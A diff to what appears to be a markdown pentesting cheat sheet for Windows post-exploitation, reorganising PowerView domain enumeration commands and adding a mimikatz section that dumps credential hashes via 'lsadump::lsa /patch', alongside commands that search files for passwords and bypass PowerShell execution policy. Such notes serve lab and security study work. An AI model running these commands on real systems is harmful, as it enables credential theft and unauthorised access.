@@ -432,8 +432,6 @@ powershell -ep bypass
 ```
 whoami /priv #/groups
 net user
-get-netuser | select cn #enum domain users
-Get-NetGroup -GroupName *admin* #enum domain groups
 net users
 net localgroups
 net user <user>
@@ -444,8 +442,20 @@ netstat -ano
 findstr /si password *.txt # .xml .ini
 findstr /spin "password" *.*
 dir /s *pass* == *cred* == *vnc* == *config*
+```
+
+PowerView.ps1
+```
 Invoke-ShareFinder
 Windows 10 Enterprise Evaluation
+get-netuser | select cn #enum domain users
+Get-NetGroup -GroupName *admin* #enum domain groups
+```
+
+mimikatz
+```
+privilege::debug #ensure that the output is "Privilege '20' ok"
+lsadump::lsa /patch #dump hashes
 ```
 
 - [powerview](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)
